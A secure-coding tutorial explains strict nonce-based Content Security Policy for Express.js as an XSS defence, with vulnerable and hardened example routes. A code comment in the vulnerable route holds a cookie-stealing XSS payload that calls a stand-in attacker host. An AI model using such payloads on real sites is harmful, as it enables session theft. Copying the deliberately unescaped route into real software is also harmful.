# Content Security Policy (CSP): Deploying Strict Nonce-Based Policies to Neutralize XSS

Cross-Site Scripting (XSS) occurs when an application renders untrusted, unescaped user input inside the browser context, allowing an attacker to execute malicious client-side JavaScript. While defensive encoding and context-aware escaping are necessary, the complexity of modern DOM templating engines means slip-ups are inevitable. 

**Content Security Policy (CSP)** is the ultimate architectural defense-in-depth safety net. By instructing the browser exactly which scripts, styles, and connections are authorized, CSP guarantees that even if an attacker successfully injects a malicious payload, the browser will refuse to compile or execute it.

---

## The Problem: The Inevitability of Code Injection

XSS is incredibly diverse—spanning Stored, Reflected, and DOM-based vectors. Once an attacker gets a script block like `<script>evil()</script>` or an inline handler like `<img src=x onerror=evil()>` to parse, they gain full read/write access over the DOM, can capture keystrokes, modify page content, and exfiltrate anti-CSRF or auth tokens.

Relying solely on developers to remember to sanitize every data insertion point is a losing battle. A Content Security Policy addresses this risk at the platform level by restricting browser capabilities via a response header (`Content-Security-Policy`).

```
                    +------------------------------------------+
                    |  Injected Payload: <script>steal()</script>|
                    +------------------------------------------+
                                         |
                                         v
                    +------------------------------------------+
                    |             Victim Browser               |
                    +------------------------------------------+
                                         |
                     Reads Header: Content-Security-Policy:
                     script-src 'nonce-RND123' 'strict-dynamic';
                                         |
                     Is script tag annotated with nonce="RND123"?
                                    /         \
                                [ Yes ]      [ No ]
                                  /             \
                    Permit Script Compile     BLOCK SCRIPT &
                                              Dispatch Report to API!
```

Legacy CSP models used domain allowlists (e.g., `script-src 'self' https://apis.google.com`). However, research has proven domain allowlists are easily bypassed via JSONP endpoints, open redirects, or script hosting facilities located on those whitelisted domains. 

Modern appsec standards mandate a **Strict CSP** model built around **cryptographic nonces (number used once)**.

---

## Vulnerable Code: The Defenseless UI

Consider this Express.js backend that dynamically interpolates user-controlled search queries without setting a security policy:

```javascript
// VULNERABLE EXPRESS PAGE RENDERER
const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const { q } = req.query; // e.g., ?q=<script>fetch('https://attacker.com?c=' + document.cookie)</script>

    // VULNERABILITY: Direct interpolation of unescaped input + no security headers.
    res.send(`
        <html>
        <body>
            <h1>Search Results for: ${q}</h1>
            <p>0 results found.</p>
        </body>
        </html>
    `);
});
```

Because there is no CSP header, the browser compiles and executes the injected script tag immediately, exfiltrating any non-HttpOnly cookies.

---

## Secure Mitigation: Implementing Strict Nonce-Based CSP

A modern, bulletproof Content Security Policy configuration uses the following setup:

1. **`default-src 'none'`**: Deny-by-default for all resource types.
2. **`script-src 'nonce-{RANDOM}' 'strict-dynamic'`**: Only execute scripts annotated with the exact matching, cryptographically secure nonce generated on-the-fly for *this specific request*. The `'strict-dynamic'` directive allows safely loaded scripts to load necessary dependency scripts without needing massive domain allowlists.
3. **`object-src 'none'`**: Disables plugins like Flash, Java Applets, or PDF viewers which can bypass standard script execution controls.
4. **`base-uri 'none'`**: Prevents injection of `<base>` tags which redirect relative URL paths (like source bundles) to attacker-controlled domains.
5. **`report-to /report-uri`**: Directs the browser to send structured JSON reports of any blocked script executions to a monitoring endpoint, giving instant visibility into active exploitation or misconfigurations.

### Production-Ready CSP Middleware (Node.js)

Below is a robust Express.js implementation that generates cryptographically secure, per-request nonces and applies a strict, modern Content Security Policy.

```javascript
const express = require('express');
const crypto = require('crypto');
const app = express();

/**
 * Middleware to generate a cryptographically secure nonce for the request lifecycle,
 * and construct the matching strict CSP header.
 */
app.use((req, res, next) => {
    // Step 1: Generate a high-entropy 128-bit random nonce encoded in Base64
    const nonce = crypto.randomBytes(16).toString('base64');
    
    // Bind the nonce to the response locals context so templates can read it
    res.locals.nonce = nonce;

    // Step 2: Define and assemble the Strict CSP directives
    const cspPolicy = [
        "default-src 'none'", // Fail closed for all resource types
        
        // Only allow scripts with the correct cryptographic nonce.
        // 'unsafe-inline' acts as a fallback ONLY for very old legacy browsers.
        `script-src 'nonce-${nonce}' 'strict-dynamic' 'unsafe-inline' https: http:`,
        
        // Style sheet restrictions (allow inline styles only if necessary, prefer nonces)
        "style-src 'self' 'unsafe-inline'",
        
        // Image constraints (restrict to self or secure HTTPS domains)
        "img-src 'self' data: https:",
        
        // Restrict API connections (fetch, websockets) to self
        "connect-src 'self'",
        
        // Prevent loading plugins
        "object-src 'none'",
        
        // Prevent modifying the base routing URI
        "base-uri 'none'",
        
        // Restrict framing of your application to prevent Clickjacking
        "frame-ancestors 'none'",
        
        // Set reporting endpoint to log policy violations
        "report-uri /api/v1/csp-violations"
    ].join('; ');

    // Set the policy header
    res.setHeader('Content-Security-Policy', cspPolicy);
    next();
});

// SECURE SEARCH ROUTE
app.get('/search', (req, res) => {
    const q = req.query.q || '';
    
    // Escape utility to handle standard HTML context escaping
    const safeQ = q.replace(/</g, "&lt;").replace(/>/g, "&gt;");

    // Even if an attacker somehow bypasses the escape replacement,
    // any script tag they inject lacking the matching request-specific nonce will be blocked.
    res.send(`
        <html>
        <head>
            <!-- Secure script declaration using the request-specific nonce -->
            <script nonce="${res.locals.nonce}" src="/js/app.js"></script>
        </head>
        <body>
            <h1>Search Results for: ${safeQ}</h1>
            <p>0 results found.</p>
        </body>
        </html>
    `);
});

// CSP Violations Logging Endpoint
app.post('/api/v1/csp-violations', express.json({ type: 'application/csp-report' }), (req, res) => {
    const report = req.body;
    console.warn(`[SECURITY ALERT] CSP Violation Detected:`, report);
    return res.sendStatus(204);
});
```

---

## Architectural Protections

1. **Eradicate Inline Event Handlers:** Completely eliminate inline script code such as `onclick="..."` or `href="javascript:..."` from your markup. Strict CSP automatically blocks these from compiling. Use `addEventListener` in external JavaScript files.
2. **Compile-Time Hash Generation:** For Single Page Applications (SPAs) like React or Angular that don't have dynamic SSR capabilities to inject per-request nonces, generate SHA-256 hashes of all static script bundles during build-time, and whitelist these hashes inside your CSP (`script-src 'sha256-abc...'`).
3. **Deploy CSP in Report-Only Mode First:** When introducing CSP to a legacy application, deploy it using the `Content-Security-Policy-Report-Only` header. This instructs the browser to log violations to your reporting API *without* actually blocking execution, allowing you to debug and refine your rules before enforcing them.
